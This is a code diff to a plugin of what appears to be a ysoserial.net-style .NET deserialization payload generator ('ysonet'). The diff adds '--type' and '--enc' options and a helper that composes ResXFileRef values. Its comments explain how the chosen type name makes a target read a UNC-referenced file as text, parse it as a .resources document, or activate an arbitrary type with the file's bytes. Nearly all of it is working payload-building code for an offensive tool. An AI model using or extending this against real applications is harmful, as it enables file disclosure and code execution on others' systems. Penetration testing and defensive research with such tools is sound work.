@@ -26,6 +26,8 @@ namespace ysonet.Plugins
     {
         static string mode = "";
         static string file = "";
+        static string filerefType = "";
+        static string filerefEncoding = "";
         static string command = "";
         static string gadget_name = "";
         static string outputfile = "";
@@ -41,6 +43,8 @@ namespace ysonet.Plugins
                 {"c|command=", "the command to be executed in BinaryFormatter and CompiledDotResources. If this is provided for SoapFormatter, it will be used as a file for ActivitySurrogateSelectorFromFile", v => command = v },
                 {"g|gadget=", "The gadget chain used for BinaryFormatter and CompiledDotResources (default: TextFormattingRunProperties).", v => gadget_name = v },
                 {"F|file=", "UNC file path location: this is used in indirect_resx_file mode.", v => file = v },
+                {"type=", "indirect_resx_file mode only: the type name the TARGET resolves with Type.GetType when it converts the file reference, which is what decides the effect. Default: " + DefaultFileRefTypeName + ", whose Stream constructor reads the file as a .resources document. System.String makes the target read the file back as text instead, and any other type with a public constructor taking one Stream is activated with the file's bytes.", v => filerefType = v },
+                {"enc=", "indirect_resx_file mode only: the encoding name the target passes to Encoding.GetEncoding, used only when --type is System.String. Omitted by default, which makes the target use Encoding.Default.", v => filerefEncoding = v },
                 {"of|outputfile=", "a file path location for CompiledDotResources to store the .resources file (default: payload.resources)", v => outputfile = v },
                 {"t|test", "Whether to run payload locally. Default: false", v => test =  v != null },
                 {"minify", "Whether to minify the payloads where applicable (experimental). Default: false", v => minify =  v != null },
@@ -48,6 +52,12 @@ namespace ysonet.Plugins
                 {"rawcmd", "Command will be executed as is without `cmd /c ` being appended (anything after the first space is an argument).", v => rawcmd = v != null },
                 {Helpers.Core.DosPolicy.AckOptionName, Helpers.Core.DosPolicy.AckHelp, v => dosAcknowledged = v != null },
             };
+
+        // What indirect_resx_file names as the converted type when --type is not given. It is
+        // byte for byte what this mode has always emitted, so an existing command produces an
+        // identical document.
+        public const string DefaultFileRefTypeName =
+            "System.Resources.ResXResourceSet, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089";
 
         public string Name()
         {
@@ -76,6 +86,14 @@ namespace ysonet.Plugins
         {
             InputArgs inputArgs = new InputArgs();
             List<string> extra;
+
+            // The option set writes into statics, so a second run in the same process would
+            // inherit the first one's values. Clear the two file-reference options before
+            // parsing, so a run without --type really is the documented default run - the
+            // interactive editor drives a plugin repeatedly in one process.
+            filerefType = "";
+            filerefEncoding = "";
+
             try
             {
                 extra = options.Parse(args);
@@ -110,6 +128,45 @@ namespace ysonet.Plugins
         public static string GetPayload(string mode, InputArgs inputArgs)
         {
             return GetPayload(mode, "", inputArgs);
+        }
+
+        /// <summary>
+        /// The one string System.Resources.ResXFileRef.Converter parses when
+        /// ResXResourceReader reads the data element below: a path, a type name, and an
+        /// optional encoding. What the target does with the file is decided entirely by the
+        /// TYPE NAME - System.String makes it read the text back, ResXResourceSet (the
+        /// default) makes it read a .resources document, and any other type is activated
+        /// with the file's bytes as its Stream argument.
+        ///
+        /// The composition rule is ResXFileRef.ToString()'s, and it is spelled out here
+        /// rather than shared with the ResXFileRef gadget: a plugin's payload lives in the
+        /// plugin's own file (Plugins/README.md), and the rule is short enough to state
+        /// twice.
+        ///
+        ///   quote the path when it contains ';' or '"', because the parser reads an
+        ///     unquoted path up to the FIRST ';' and a quoted one up to the LAST '"';
+        ///   then the separator and the type name;
+        ///   then ';' and the encoding name, only when one was asked for.
+        ///
+        /// The separator keeps the space this mode has always written. Type.GetType skips
+        /// leading whitespace in a type name, so the space changes nothing on the target,
+        /// and keeping it means every command written before --type existed still produces
+        /// a byte-identical document.
+        /// </summary>
+        private static string ComposeFileRefValue(string path, string typeName, string encodingName)
+        {
+            if (String.IsNullOrEmpty(typeName) || String.IsNullOrWhiteSpace(typeName))
+                typeName = DefaultFileRefTypeName;
+
+            string value = (path.IndexOf(';') >= 0 || path.IndexOf('"') >= 0)
+                ? "\"" + path + "\";"
+                : path + ";";
+            value += " " + typeName;
+
+            if (!String.IsNullOrEmpty(encodingName) && !String.IsNullOrWhiteSpace(encodingName))
+                value += ";" + encodingName.Trim();
+
+            return value;
         }
         public static string GetPayload(string mode, string file, InputArgs inputArgs)
         {
@@ -186,7 +243,7 @@ namespace ysonet.Plugins
                     if (!String.IsNullOrEmpty(file) && !String.IsNullOrWhiteSpace(file))
                     {
                         mtype = @"type=""System.Resources.ResXFileRef""";
-                        payloadValue = file + "; System.Resources.ResXResourceSet, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089";
+                        payloadValue = ComposeFileRefValue(file, filerefType, filerefEncoding);
                     }
                     break;
                 case "binaryformatter":
